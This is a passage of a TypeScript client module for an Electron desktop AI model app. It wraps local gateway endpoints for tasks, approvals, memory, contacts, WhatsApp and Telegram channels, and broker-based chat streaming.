  transcribe: (audioBase64: string, language?: string) =>
    electronTranscribe(audioBase64, language),
  downloadArtifact: (thread: string, name: string, version?: number) =>
    electronArtifactBlob(thread, name, version),
  artifactPdfPages: (thread: string, name: string, version?: number) =>
    electronArtifactPdfPages(thread, name, version),
  artifactVersions: (thread: string, name: string) => electronArtifactVersions(thread, name),
  saveArtifactContent: (thread: string, name: string, content: string) =>
    electronSaveArtifactContent(thread, name, content),
  memoryGraph: (thread?: string, workspace?: string) => electronMemoryGraph(thread, workspace),
  mergeMemoryEntities: (survivorRef: string, absorbedRef: string, reason?: string) =>
    electronMergeMemoryEntities(survivorRef, absorbedRef, reason),
  memoryHygieneSuggestions: (thread?: string, workspace?: string) =>
    electronMemoryHygieneSuggestions(thread, workspace),
  memoryWiki: (thread?: string, workspace?: string) => electronMemoryWiki(thread, workspace),
  saveMemoryWiki: (scope: { thread?: string; workspace?: string }, path: string, body: string) =>
    electronSaveMemoryWiki(scope, path, body),
  consolidateMemory: (workspace?: string) => electronConsolidateMemory(workspace),
  artifactFolder: (thread: string) => electronArtifactFolder(thread),
  artifactsUsage: () => electronArtifactsUsage(),
  exportArtifacts: (files: ExportArtifactFileRequest[]) => electronExportArtifacts(files),
  memoryArtifacts: (thread?: string) => electronMemoryArtifacts(thread),
  artifactDestinations: () => electronArtifactDestinations(),
  addArtifactDestination: (label: string, path: string) =>
    electronAddArtifactDestination(label, path),
  removeArtifactDestination: (path: string) => electronRemoveArtifactDestination(path),
  deleteMemoryArtifact: (reference: string) => electronDeleteMemoryArtifact(reference),
  deleteArtifactFile: (thread: string, name: string) =>
    electronDeleteArtifactFile(thread, name),
  deleteArtifactThread: (thread: string) => electronDeleteArtifactThread(thread),
  clearArtifacts: () => electronClearArtifacts(),
  revealPath: (path: string) => revealWorkspacePath(path),
  threadFolder: (threadId: string) => electronThreadFolder(threadId),
  fsList: (path: string | null, threadId?: string) => electronFsList(path, threadId),
  fsFile: (path: string, threadId?: string) => electronFsFile(path, threadId),
  cancelTask: (taskId: string) => electronCancelTask(taskId),
  setThreadFolder: (threadId: string, path: string | null) =>
    electronSetThreadFolder(threadId, path),
  searchThreadFiles: (threadId: string, query: string) =>
    electronSearchThreadFiles(threadId, query),
  readThreadFile: (threadId: string, path: string) =>
    electronReadThreadFile(threadId, path),
  pickFolder: () => pickWorkspaceFolder(),
  cancelChatPromptStream: (requestId: string) => cancelChatPromptStream(requestId),
  debugChatStream: (
    requestId: string,
    payload: {
      stage: string;
      chunks?: number;
      chars?: number;
      elapsed_ms?: number;
      detail?: string;
    },
  ) => chatApi.debugChatStream(requestId, payload),
  continueChatMessageStream: (
    requestId: string,
    threadId: string,
    messageId: string,
    sessionId: string,
    previousText: string,
    model?: string,
  ) =>
    submitBrowserRuntimeChatPromptStream(
      requestId,
      threadId,
      sessionId,
      continuationPromptForMessage(previousText),
      "Continue",
      messageId,
      previousText,
      model,
    ),
  listenChatStreamDelta: (handler: (payload: CoreChatStreamDelta) => void) =>
    chatApi.listenChatStreamDelta(handler),
  listenChatStreamEvent: (handler: (payload: CoreChatStreamEvent) => void) =>
    chatApi.listenChatStreamEvent(handler),
  submitUserPrompt: (sessionId: string, prompt: string) =>
    submitBrowserRuntimeChatPromptStream(
      `electron_prompt_${Date.now()}`,
      "thread_active_prompt",
      sessionId,
      prompt,
    ),
  runPromptPlanNextStep: (_sessionId: string) =>
    Promise.resolve({
      status: "skipped",
      task_id: null,
      message: "Operational planner not yet extracted in the Electron gateway.",
    }),
  runPromptPlanReadySteps: (_sessionId: string, _maxSteps = 4) =>
    electronRunNextTask(),
};

async function cancelChatPromptStream(requestId: string) {
  // Cancel the running turn on the broker (DELETE /turns/{id}). The turn_id is
  // derived from the requestId the same way the enqueue does (`turn_{requestId}`),
  // so Stop actually aborts the turn server-side instead of being a no-op.
  await cancelTurn(`turn_${requestId}`);
}

function electronCoreStatus(): CoreBridgeStatus {
  return {
    user_id: "local-user",
    workspace_id: "local-workspace",
    local_first: true,
    cloud_api_enabled: false,
    components: [
      { id: "desktop-shell", label: "Electron", status: "ready" },
    ],
  };
}

function emptyTaskQueue(): CoreTaskQueueSnapshot {
  return {
    queued: [],
    active: [],
    blocked: [],
    waiting_approvals: [],
    recent_failures: [],
    resource_usage: [],
  };
}

async function electronTaskQueue(threadId?: string): Promise<CoreTaskQueueSnapshot> {
  try {
    const suffix = threadId ? `?thread_id=${encodeURIComponent(threadId)}` : "";
    const response = await fetch(`${DESKTOP_GATEWAY_URL}/api/tasks/queue${suffix}`, {
      headers: gatewayHeaders(),
    });
    if (!response.ok) {
      throw new Error(`Desktop Gateway task queue HTTP ${response.status}`);
    }
    return response.json() as Promise<CoreTaskQueueSnapshot>;
  } catch {
    return emptyTaskQueue();
  }
}

async function electronTaskExecutorStatus(): Promise<CoreTaskExecutorStatus> {
  try {
    const response = await fetch(`${DESKTOP_GATEWAY_URL}/api/tasks/executor`, {
      headers: gatewayHeaders(),
    });
    if (!response.ok) {
      throw new Error(`Desktop Gateway task executor HTTP ${response.status}`);
    }
    return response.json() as Promise<CoreTaskExecutorStatus>;
  } catch {
    return {
      enabled: false,
      worker_id: "desktop-gateway-background-worker",
      poll_interval_ms: 0,
      status: "unavailable",
      last_tick_at: null,
      last_task_id: null,
      last_message: "Local executor unreachable.",
      completed_count: 0,
      failure_count: 0,
    };
  }
}

async function electronTaskDetail(taskId: string): Promise<CoreTaskDetail | null> {
  try {
    const response = await fetch(
      `${DESKTOP_GATEWAY_URL}/api/tasks/${encodeURIComponent(taskId)}`,
      { headers: gatewayHeaders() },
    );
    if (!response.ok) {
      throw new Error(`Desktop Gateway task detail HTTP ${response.status}`);
    }
    return response.json() as Promise<CoreTaskDetail | null>;
  } catch {
    return null;
  }
}

async function electronApproveApprovel(
  approvalId: string,
  options?: ApprovelDecisionOptions,
): Promise<CoreTaskQueueSnapshot> {
  try {
    const response = await fetch(
      `${DESKTOP_GATEWAY_URL}/api/approvals/${encodeURIComponent(approvalId)}/approve`,
      {
        method: "POST",
        headers: options
          ? { ...gatewayHeaders(), "Content-Type": "application/json" }
          : gatewayHeaders(),
        ...(options ? { body: JSON.stringify(options) } : {}),
      },
    );
    if (!response.ok) {
      throw new Error(`Desktop Gateway approval HTTP ${response.status}`);
    }
    return response.json() as Promise<CoreTaskQueueSnapshot>;
  } catch {
    return emptyTaskQueue();
  }
}

async function electronRejectApprovel(
  approvalId: string,
  reason: string,
): Promise<CoreTaskQueueSnapshot> {
  try {
    const response = await fetch(
      `${DESKTOP_GATEWAY_URL}/api/approvals/${encodeURIComponent(approvalId)}/reject`,
      {
        method: "POST",
        headers: gatewayHeaders(),
        body: JSON.stringify({ reason }),
      },
    );
    if (!response.ok) {
      throw new Error(`Desktop Gateway approval HTTP ${response.status}`);
    }
    return response.json() as Promise<CoreTaskQueueSnapshot>;
  } catch {
    return emptyTaskQueue();
  }
}

async function electronRunNextTask(): Promise<CorePromptPlanBatchRunResult> {
  try {
    const response = await fetch(`${DESKTOP_GATEWAY_URL}/api/tasks/run_next`, {
      method: "POST",
      headers: gatewayHeaders(),
    });
    if (!response.ok) {
      throw new Error(`Desktop Gateway task run HTTP ${response.status}`);
    }
    return response.json() as Promise<CorePromptPlanBatchRunResult>;
  } catch {
    return {
      status: "failed",
      completed: 0,
      stopped_reason: "Local executor unreachable.",
      results: [],
    };
  }
}

async function electronLocalComputerSession(
  sessionId: string,
): Promise<CoreComputerSessionSnapshot> {
  try {
    const response = await fetch(
      `${DESKTOP_GATEWAY_URL}/api/local-computer/sessions/${encodeURIComponent(sessionId)}`,
      { headers: gatewayHeaders() },
    );
    if (!response.ok) {
      throw new Error(`Desktop Gateway local computer HTTP ${response.status}`);
    }
    const snapshot = (await response.json()) as CoreComputerSessionSnapshot | null;
    return snapshot ?? browserComputerSession(sessionId, 0);
  } catch {
    return browserComputerSession(sessionId, 0);
  }
}

async function electronLocalComputerArtifactPreview(
  sessionId: string,
  artifactId: string,
): Promise<CoreComputerArtifactPreview | null> {
  try {
    const response = await fetch(
      `${DESKTOP_GATEWAY_URL}/api/local-computer/sessions/${encodeURIComponent(sessionId)}/artifacts/${encodeURIComponent(artifactId)}/preview`,
      { headers: gatewayHeaders() },
    );
    if (!response.ok) {
      throw new Error(`Desktop Gateway artifact preview HTTP ${response.status}`);
    }
    return response.json() as Promise<CoreComputerArtifactPreview | null>;
  } catch {
    return null;
  }
}

function emptyMemoryDashboard(): CoreMemoryDashboard {
  return {
    total_memories: 0,
    total_entities: 0,
    total_relations: 0,
    total_wiki_pages: 0,
    by_status: [],
    by_privacy_domain: [],
    by_sensitivity: [],
    access_audit_count: 0,
  };
}

async function electronMemoryDashboard(): Promise<CoreMemoryDashboard> {
  try {
    const response = await fetch(`${DESKTOP_GATEWAY_URL}/api/memory/dashboard`, {
      headers: gatewayHeaders(),
    });
    if (!response.ok) {
      throw new Error(`Desktop Gateway memory dashboard HTTP ${response.status}`);
    }
    return response.json() as Promise<CoreMemoryDashboard>;
  } catch {
    return emptyMemoryDashboard();
  }
}

async function electronExportLocalData(): Promise<unknown> {
  return gatewayGetJson<unknown>("/api/memory/export");
}

export type CoreMemoryItem = {
  reference: string;
  scope: string;
  workspace_id: string;
  workspace_label: string;
  memory_type: string;
  status: string;
  sensitivity: string;
  confidence: number;
  text: string;
  created_at: string;
  certainty: string;
};

export type CoreMemoryScope = {
  workspace_id: string;
  workspace_label: string;
  scope: string;
  has_folder: boolean;
};

async function electronMemoryItems(): Promise<{ items: CoreMemoryItem[]; scopes: CoreMemoryScope[] }> {
  try {
    const response = await fetch(`${DESKTOP_GATEWAY_URL}/api/memory/items`, {
      headers: gatewayHeaders(),
    });
    if (!response.ok) {
      throw new Error(`Desktop Gateway memory items HTTP ${response.status}`);
    }
    const body = await response.json();
    // Back-compat: the old shape was a bare array of items.
    if (Array.isArray(body)) return { items: body as CoreMemoryItem[], scopes: [] };
    return { items: body.items ?? [], scopes: body.scopes ?? [] };
  } catch {
    return { items: [], scopes: [] };
  }
}

/// Ensure a project's code graph is fresh (builds it transparently on open).
/// Returns true if a build was kicked off; UI reloads on the project_graph.ready event.
/// An optional `subpath` scopes the map to one subtree (huge-repo escape hatch).
export type ProjectGoalsData = {
  workspace: string;
  is_project: boolean;
  goals: { reference: string; text: string }[];
  decisions: { reference: string; text: string }[];
  /** North-star objective text for the workspace (Task 4c); null when none is set
   *  (personal/threads workspace, or no confirmed goal memory yet). */
  objective?: string | null;
};

/** ADR 0022 (Piano UI A5): project briefing — ciò che l'agente SA stabilmente del
 *  progetto (objective/brief/open-loops/decisions/goals) con provenance cross-chat. */
export type ProjectBriefingItem = {
  reference: string;
  text: string;
  thread_id: string | null;
};
export type ProjectBriefingData = {
  workspace: string;
  is_project: boolean;
  objective: string | null;
  brief: { body: string } | null;
  open_loops: ProjectBriefingItem[];
  decisions: ProjectBriefingItem[];
  goals: ProjectBriefingItem[];
};

/// Goals + promotable decisions for the active chat's project (resolved from threadId).
async function electronProjectGoals(threadId: string): Promise<ProjectGoalsData | null> {
  try {
    const response = await fetch(
      `${DESKTOP_GATEWAY_URL}/api/memory/goals?thread=${encodeURIComponent(threadId)}`,
      { headers: gatewayHeaders() },
    );
    if (!response.ok) return null;
    return (await response.json()) as ProjectGoalsData;
  } catch {
    return null;
  }
}

/// ADR 0022 (Piano UI A5): project briefing for the active chat's project.
async function electronProjectBriefing(threadId: string): Promise<ProjectBriefingData | null> {
  try {
    const response = await fetch(
      `${DESKTOP_GATEWAY_URL}/api/memory/project-briefing?thread=${encodeURIComponent(threadId)}`,
      { headers: gatewayHeaders() },
    );
    if (!response.ok) return null;
    return (await response.json()) as ProjectBriefingData;
  } catch {
    return null;
  }
}

/// Ask the assistant to PROPOSE objectives (north star) from the project context. The
/// user edits/confirms before any is saved. Returns draft objective strings.
async function electronSuggestGoals(threadId: string): Promise<string[]> {
  try {
    const response = await fetch(`${DESKTOP_GATEWAY_URL}/api/memory/goals/suggest`, {
      method: "POST",
      headers: { ...gatewayHeaders(), "Content-Type": "application/json" },
      body: JSON.stringify({ thread: threadId }),
    });
    if (!response.ok) return [];
    const body = (await response.json()) as { objectives?: string[] };
    return body.objectives ?? [];
  } catch {
    return [];
  }
}

/// Promote selected memories (decisions the user flagged) to project goals — LLM-free,
/// user-driven. Returns how many were promoted. Refreshes the project brief.
async function electronPromoteGoals(workspace: string, refs: string[]): Promise<number> {
  try {
    const response = await fetch(`${DESKTOP_GATEWAY_URL}/api/memory/goals/promote`, {
      method: "POST",
      headers: { ...gatewayHeaders(), "Content-Type": "application/json" },
      body: JSON.stringify({ workspace, refs }),
    });
    if (!response.ok) return 0;
    const body = (await response.json()) as { promoted?: number };
    return body.promoted ?? 0;
  } catch {
    return 0;
  }
}

/// Add a fresh project goal authored by the user.
async function electronAddGoal(workspace: string, text: string): Promise<boolean> {
  try {
    const response = await fetch(`${DESKTOP_GATEWAY_URL}/api/memory/goals/add`, {
      method: "POST",
      headers: { ...gatewayHeaders(), "Content-Type": "application/json" },
      body: JSON.stringify({ workspace, text }),
    });
    return response.ok;
  } catch {
    return false;
  }
}

async function electronEnsureProjectGraph(workspace: string, subpath?: string): Promise<boolean> {
  try {
    const response = await fetch(`${DESKTOP_GATEWAY_URL}/api/memory/project-graph/ensure`, {
      method: "POST",
      headers: { ...gatewayHeaders(), "Content-Type": "application/json" },
      body: JSON.stringify({ workspace, subpath }),
    });
    if (!response.ok) return false;
    const body = (await response.json()) as { building?: boolean };
    return body.building ?? false;
  } catch {
    return false;
  }
}

export type ProjectSubdir = { name: string; code_files: number };

/// Lists a project's code subfolders (with code-file counts) so a huge repo can be
/// mapped one subtree at a time.
async function electronProjectGraphSubdirs(workspace: string): Promise<ProjectSubdir[]> {
  try {
    const response = await fetch(
      `${DESKTOP_GATEWAY_URL}/api/memory/project-graph/subdirs?workspace=${encodeURIComponent(workspace)}`,
      { headers: gatewayHeaders() },
    );
    if (!response.ok) return [];
    const body = (await response.json()) as { subdirs?: ProjectSubdir[] };
    return body.subdirs ?? [];
  } catch {
    return [];
  }
}

async function electronDecideMemory(
  reference: string,
  action: "confirm" | "reject" | "delete" | "edit",
  text?: string,
): Promise<void> {
  const response = await fetch(`${DESKTOP_GATEWAY_URL}/api/memory/decide`, {
    method: "POST",
    headers: { ...gatewayHeaders(), "Content-Type": "application/json" },
    body: JSON.stringify({ reference, action, ...(text !== undefined ? { text } : {}) }),
  });
  if (!response.ok) {
    throw new Error(`Desktop Gateway memory decide HTTP ${response.status}`);
  }
}

export type CoreWhatsAppStatus = {
  connected: boolean;
  needs_pairing: boolean;
  qr: string | null;
  pair_code: string | null;
  running: boolean;
};

async function electronWhatsAppStatus(): Promise<CoreWhatsAppStatus> {
  try {
    const response = await fetch(`${DESKTOP_GATEWAY_URL}/api/channels/whatsapp/status`, {
      headers: gatewayHeaders(),
    });
    if (!response.ok) {
      throw new Error(`whatsapp status HTTP ${response.status}`);
    }
    return response.json() as Promise<CoreWhatsAppStatus>;
  } catch {
    return { connected: false, needs_pairing: false, qr: null, pair_code: null, running: false };
  }
}

async function electronWhatsAppConnect(phone?: string): Promise<void> {
  const response = await fetch(`${DESKTOP_GATEWAY_URL}/api/channels/whatsapp/connect`, {
    method: "POST",
    headers: { ...gatewayHeaders(), "Content-Type": "application/json" },
    body: JSON.stringify(phone ? { phone } : {}),
  });
  if (!response.ok) {
    const detail = await response.text().catch(() => "");
    throw new Error(detail || `connect HTTP ${response.status}`);
  }
}

async function electronWhatsAppDisconnect(): Promise<void> {
  await fetch(`${DESKTOP_GATEWAY_URL}/api/channels/whatsapp/disconnect`, {
    method: "POST",
    headers: gatewayHeaders(),
  });
}

export type CoreTelegramStatus = {
  connected: boolean;
  bot_username: string | null;
  error: string | null;
  running: boolean;
};

async function electronTelegramStatus(): Promise<CoreTelegramStatus> {
  try {
    const response = await fetch(`${DESKTOP_GATEWAY_URL}/api/channels/telegram/status`, {
      headers: gatewayHeaders(),
    });
    if (!response.ok) {
      throw new Error(`telegram status HTTP ${response.status}`);
    }
    return response.json() as Promise<CoreTelegramStatus>;
  } catch {
    return { connected: false, bot_username: null, error: null, running: false };
  }
}

async function electronTelegramConnect(token?: string): Promise<void> {
  const response = await fetch(`${DESKTOP_GATEWAY_URL}/api/channels/telegram/connect`, {
    method: "POST",
    headers: { ...gatewayHeaders(), "Content-Type": "application/json" },
    body: JSON.stringify(token ? { token } : {}),
  });
  if (!response.ok) {
    const detail = await response.text().catch(() => "");
    throw new Error(detail || `telegram connect HTTP ${response.status}`);
  }
}

async function electronTelegramDisconnect(): Promise<void> {
  await fetch(`${DESKTOP_GATEWAY_URL}/api/channels/telegram/disconnect`, {
    method: "POST",
    headers: gatewayHeaders(),
  });
}

export type CoreChannelSettings = {
  /** Master kill-switch: when false every inbound action is Ignore. */
  enabled: boolean;
  /** Auto-reply (text only) for allowlisted contacts. */
  auto_reply: boolean;
  /** Sender identifiers (phone/LID) allowed to trigger an auto-reply. */
  allowlist: string[];
};

async function electronChannelSettings(): Promise<CoreChannelSettings> {
  try {
    const response = await fetch(`${DESKTOP_GATEWAY_URL}/api/channels/settings`, {
      headers: gatewayHeaders(),
    });
    if (!response.ok) {
      throw new Error(`channel settings HTTP ${response.status}`);
    }
    return response.json() as Promise<CoreChannelSettings>;
  } catch {
    return { enabled: false, auto_reply: false, allowlist: [] };
  }
}

async function electronSetChannelSettings(
  settings: CoreChannelSettings,
): Promise<CoreChannelSettings> {
  const response = await fetch(`${DESKTOP_GATEWAY_URL}/api/channels/settings`, {
    method: "POST",
    headers: { ...gatewayHeaders(), "Content-Type": "application/json" },
    body: JSON.stringify(settings),
  });
  if (!response.ok) {
    const detail = await response.text().catch(() => "");
    throw new Error(detail || `channel settings HTTP ${response.status}`);
  }
  return response.json() as Promise<CoreChannelSettings>;
}

export type CoreContactChannel = { channel: string; address: string };
export type CoreContact = {
  reference: string;
  name: string;
  contact_type: string;
  is_self: boolean;
  channels: CoreContactChannel[];
  notes: string;
  soul_md: string;
  memory_count: number;
  /** '' = inherit channel/global default; automatic | draft | silent. */
  response_mode: string;
  tone_of_voice: string;
  persona_instructions: string;
  /** Default named profile; channel_profiles override it per channel. */
  profile_id: number | null;
  birthday: string | null;
  channel_profiles: { channel: string; profile_id: number }[];
};

/** A reusable named persona ("Personal", "Lavoro") assignable to contacts. */
export type CoreProfile = {
  id: number;
  name: string;
  tone_of_voice: string;
  instructions: string;
};

export type CoreRelationship = {
  id: number;
  other_reference: string;
  other_name: string;
  relationship_type: string;
  outgoing: boolean;
};

/** Per-contact isolation perimeter (what a channel reply may see/use). */
export type CoreContactPerimeter = {
  memory_scope: string;
  knowledge_folders: string[];
  tools_allowed: string[];
  tools_denied: string[];
  can_see_contacts: boolean;
  can_see_calendar: boolean;
};

async function electronContacts(): Promise<CoreContact[]> {
  try {
    const response = await fetch(`${DESKTOP_GATEWAY_URL}/api/memory/contacts`, {
      headers: gatewayHeaders(),
    });
    if (!response.ok) throw new Error(`contacts HTTP ${response.status}`);
    return response.json() as Promise<CoreContact[]>;
  } catch {
    return [];
  }
}

async function electronContactMemories(reference: string): Promise<string[]> {
  try {
    const response = await fetch(`${DESKTOP_GATEWAY_URL}/api/memory/contacts/memories`, {
      method: "POST",
      headers: { ...gatewayHeaders(), "Content-Type": "application/json" },
      body: JSON.stringify({ reference }),
    });
    if (!response.ok) throw new Error(`contact memories HTTP ${response.status}`);
    return response.json() as Promise<string[]>;
  } catch {
    return [];
  }
}

async function electronUpdateContact(update: {
  reference: string;
  name?: string;
  contact_type?: string;
  notes?: string;
  soul_md?: string;
  tone_of_voice?: string;
  persona_instructions?: string;
  response_mode?: string;
  birthday?: string;
}): Promise<CoreContact> {
  const response = await fetch(`${DESKTOP_GATEWAY_URL}/api/memory/contacts/update`, {
    method: "POST",
    headers: { ...gatewayHeaders(), "Content-Type": "application/json" },
    body: JSON.stringify(update),
  });
  if (!response.ok) {
    const detail = await response.text().catch(() => "");
    throw new Error(detail || `contact update HTTP ${response.status}`);
  }
  return response.json() as Promise<CoreContact>;
}

async function electronMergeContacts(from: string, into: string): Promise<CoreContact> {
  const response = await fetch(`${DESKTOP_GATEWAY_URL}/api/memory/contacts/merge`, {
    method: "POST",
    headers: { ...gatewayHeaders(), "Content-Type": "application/json" },
    body: JSON.stringify({ from, into }),
  });
  if (!response.ok) {
    const detail = await response.text().catch(() => "");
    throw new Error(detail || `contact merge HTTP ${response.status}`);
  }
  return response.json() as Promise<CoreContact>;
}

async function electronCreateteContact(input: {
  name: string;
  contact_type?: string;
  channel?: string;
  identifier?: string;
}): Promise<CoreContact> {
  const response = await fetch(`${DESKTOP_GATEWAY_URL}/api/memory/contacts/create`, {
    method: "POST",
    headers: { ...gatewayHeaders(), "Content-Type": "application/json" },
    body: JSON.stringify(input),
  });
  if (!response.ok) {
    const detail = await response.text().catch(() => "");
    throw new Error(detail || `contact create HTTP ${response.status}`);
  }
  return response.json() as Promise<CoreContact>;
}

async function contactsPost<T>(path: string, body: unknown): Promise<T> {
  const response = await fetch(`${DESKTOP_GATEWAY_URL}${path}`, {
    method: "POST",
    headers: { ...gatewayHeaders(), "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });
  if (!response.ok) {
    const detail = await response.text().catch(() => "");
    throw new Error(detail || `${path} HTTP ${response.status}`);
  }
  return response.json() as Promise<T>;
}

async function electronProfiles(): Promise<CoreProfile[]> {
  try {
    return await gatewayGetJson<CoreProfile[]>("/api/profiles");
  } catch {
    return [];
  }
}

async function electronContactPerimeter(reference: string): Promise<CoreContactPerimeter> {
  const response = await fetch(`${DESKTOP_GATEWAY_URL}/api/memory/contacts/perimeter`, {
    method: "POST",
    headers: { ...gatewayHeaders(), "Content-Type": "application/json" },
    body: JSON.stringify({ reference }),
  });
  if (!response.ok) {
    throw new Error(`contact perimeter HTTP ${response.status}`);
  }
  return response.json() as Promise<CoreContactPerimeter>;
}

async function electronSetContactPerimeter(
  reference: string,
  perimeter: CoreContactPerimeter,
): Promise<CoreContactPerimeter> {
  const response = await fetch(`${DESKTOP_GATEWAY_URL}/api/memory/contacts/perimeter/update`, {
    method: "POST",
    headers: { ...gatewayHeaders(), "Content-Type": "application/json" },
    body: JSON.stringify({ reference, ...perimeter }),
  });
  if (!response.ok) {
    const detail = await response.text().catch(() => "");
    throw new Error(detail || `contact perimeter update HTTP ${response.status}`);
  }
  return response.json() as Promise<CoreContactPerimeter>;
}

async function electronDeleteContact(reference: string): Promise<void> {
  const response = await fetch(`${DESKTOP_GATEWAY_URL}/api/memory/contacts/delete`, {
    method: "POST",
    headers: { ...gatewayHeaders(), "Content-Type": "application/json" },
    body: JSON.stringify({ reference }),
  });
  if (!response.ok) {
    const detail = await response.text().catch(() => "");
    throw new Error(detail || `contact delete HTTP ${response.status}`);
  }
}

export type CoreContactFact = {
  /** Memory record ref — lets the UI delete this single fact from the graph. */
  reference: string;
  text: string;
  /** "durable" | "transient" | "event" */
  temporality: string;
  /** Period the fact refers to (YYYY-MM-DD / YYYY-MM), "" if durable/undatable. */
  date: string;
};
export type CoreContactProfile = {
  /** Read live from the memory graph — always fresh (a deleted fact isn't returned). */
  facts: CoreContactFact[];
  episode_count: number;
};

async function electronContactProfile(reference: string): Promise<CoreContactProfile> {
  try {
    const response = await fetch(`${DESKTOP_GATEWAY_URL}/api/memory/contacts/profile`, {
      method: "POST",
      headers: { ...gatewayHeaders(), "Content-Type": "application/json" },
      body: JSON.stringify({ reference }),
    });
    if (!response.ok) throw new Error(`contact profile HTTP ${response.status}`);
    return response.json() as Promise<CoreContactProfile>;
  } catch {
    return { facts: [], episode_count: 0 };
  }
}

async function electronRefreshContactProfile(reference: string): Promise<CoreContactProfile> {
  const response = await fetch(`${DESKTOP_GATEWAY_URL}/api/memory/contacts/profile/refresh`, {
    method: "POST",
    headers: { ...gatewayHeaders(), "Content-Type": "application/json" },
    body: JSON.stringify({ reference }),
  });
  if (!response.ok) {
    const detail = await response.text().catch(() => "");
    throw new Error(detail || `contact profile refresh HTTP ${response.status}`);
  }
  return response.json() as Promise<CoreContactProfile>;
}

function emptyCapabilitySnapshot(): CoreCapabilitySnapshot {
  return {
    connections: [],
    tools: [],
    policy: {
      enabled_providers: [],
      allow_managed_cloud: false,
      privacy_domains: ["local"],
      max_autonomy_level: 1,
    },
  };
}

async function electronCapabilities(): Promise<CoreCapabilitySnapshot> {
  try {
    const response = await fetch(`${DESKTOP_GATEWAY_URL}/api/capabilities/snapshot`, {
      headers: gatewayHeaders(),
    });
    if (!response.ok) {
      throw new Error(`Desktop Gateway capabilities HTTP ${response.status}`);
    }
    return response.json() as Promise<CoreCapabilitySnapshot>;
  } catch {
    return emptyCapabilitySnapshot();
  }
}

async function submitBrokerRuntimeChatPromptStream(
  requestId: string,
  threadId: string,
  sessionId: string,
  prompt: string,
  visiblePrompt?: string,
  assistantMessageId?: string,
  previousAssistantText?: string,
  model?: string,
  images?: string[],
  attachments?: ChatAttachmentInput[],
  mode?: string,
  branchFromId?: string | null,
  regenerateFromUserId?: string | null,
  contextOverride?: Array<{ role: "user" | "assistant"; text: string }>,
): Promise<CorePromptSubmissionResult> {
  const startedAt = performance.now();
  const maxTokens = browserChatMaxTokens(prompt);
  const promptBuildStartedAt = performance.now();
  // Broker path: enqueue (POST /turns) then subscribe (GET /turns/{id}/stream).
  // The broker is the server-owned source of truth: it persists the user message
  // atomically with the enqueue, runs the turn, persists the assistant message on
  // done, and emits durable turn_events for the live stream. We NO LONGER call
  // commit_prompt_result — the broker commits.
  const enqueued = await enqueueTurn(threadId, requestId, prompt, {
    visiblePrompt,
    images,
    attachments: attachments?.length ? attachments : undefined,
    mode,
    model,
  });
  const turnId = enqueued.turn_id;
  const promptBuildSeconds = roundedSeconds(
    (performance.now() - promptBuildStartedAt) / 1000,
  );

  // The bridge subscribes to the unified WS for this turn's events. The WS
  // delivers turn.event messages with {turn_id, seq, kind, payload}. We
  // accumulate delta text, dispatch activity/plan to the UI, and resolve the
  // Promise when done/error arrives.
  let text = "";
  let redactedUserText: string | undefined;
  let metrics: Partial<CoreChatMessageMetrics> = {};
  let firstTokenSeconds: number | undefined;
  keepDesktopAwake(true);
  try {
    await new Promise<void>((resolve, reject) => {
      const unsub = wsSubscription.subscribe((msg) => {
        if (msg.type !== "turn.event") return;
        if ((msg.turn_id as string) !== turnId) return;
        const kind = msg.kind as string;
        const payload = (msg.payload ?? {}) as Record<string, unknown>;
        if (kind === "delta") {
          const deltaText = String(payload.text ?? "");
          if (deltaText && firstTokenSeconds === undefined) {
            firstTokenSeconds = roundedSeconds((performance.now() - startedAt) / 1000);
          }
          text += deltaText;
          chatApi.notifyChatStreamDelta({
            type: "delta",
            request_id: requestId,
            delta: deltaText,
          });
        } else if (kind === "done") {
          chatApi.notifyChatStreamEvent({ type: "done", request_id: requestId });
          unsub();
          resolve();
        } else if (kind === "error") {
          const errMsg = String((payload as { message?: string }).message ?? "Turn error");
          chatApi.notifyChatStreamEvent({
            type: "error",
            request_id: requestId,
            message: errMsg,
          });
          unsub();
          reject(new Error(errMsg));
        } else {
          // activity, plan_update, reasoning, tool_result, queued, retry
          const legacyType = kind === "tool" ? "tool_result" : kind;
          chatApi.notifyChatStreamEvent({
            type: legacyType as CoreChatStreamEvent["type"],
            request_id: requestId,
            text: payload.text ? String(payload.text) : undefined,
            markdown: payload.markdown ? String(payload.markdown) : undefined,
            payload,
          } as CoreChatStreamEvent);
        }
      });
    });
  } finally {
    keepDesktopAwake(false);
  }

  const timestamp = currentTimestampSeconds();
  const totalElapsedSeconds = roundedSeconds((performance.now() - startedAt) / 1000);
  const promptAttachments = (attachments ?? []).map(coreAttachmentFromInput);
  const assistantText = previousAssistantText
    ? joinContinuetionText(previousAssistantText, text)
    : text.trim();
  const result: CorePromptSubmissionResult = {
    effective_model: model ?? null,
    user_message: {
      id: `browser_user_${Date.now()}`,
      role: "user",
      text: redactedUserText ?? visiblePrompt ?? prompt,
      timestamp,
      metadata: null,
      metrics: null,
      attachments: promptAttachments,
    },
    assistant_message: {
      id: assistantMessageId ?? `browser_assistant_${Date.now()}`,
      role: "assistant",
      text: assistantText,
      timestamp,
      metadata: "Local model",
      metrics: {
        prompt_tokens: metrics.prompt_tokens ?? 0,
        generation_tokens:
          metrics.generation_tokens || Math.max(1, Math.round(assistantText.length / 4)),
        prompt_tps: metrics.prompt_tps ?? 0,
        generation_tps: metrics.generation_tps ?? 0,
        peak_memory_gb: metrics.peak_memory_gb ?? 0,
        elapsed_seconds: metrics.elapsed_seconds || totalElapsedSeconds,
        max_tokens: maxTokens,
        prompt_build_seconds: promptBuildSeconds,
        time_to_first_token_seconds: firstTokenSeconds ?? null,
        total_elapsed_seconds: totalElapsedSeconds,
        runtime_status_before: null,
      },
    },
    computer_session: browserComputerSession(sessionId, totalElapsedSeconds),
    plan: null,
  };
  // BROKER PATH: NO client-side commit. The broker persists the assistant message
  // when the turn reaches `done`. The client refreshes from the backend (polling
  // every 2.5s in App.tsx) to pick up the authoritative persisted text.
  result.computer_session = await electronLocalComputerSession(sessionId);
  return result;
}

/**
 * Chat entry point: enqueues the turn on the broker (the server-owned source of
 * truth) and reads its live events off the unified WebSocket. Kept as a thin
 * indirection over the broker impl so callers (ChatView) have a stable name.
 */
async function submitBrowserRuntimeChatPromptStream(
  requestId: string,
  threadId: string,
  sessionId: string,
  prompt: string,
  visiblePrompt?: string,
  assistantMessageId?: string,
  previousAssistantText?: string,
  model?: string,
  images?: string[],
  attachments?: ChatAttachmentInput[],
  mode?: string,
  branchFromId?: string | null,
  regenerateFromUserId?: string | null,
  contextOverride?: Array<{ role: "user" | "assistant"; text: string }>,
): Promise<CorePromptSubmissionResult> {
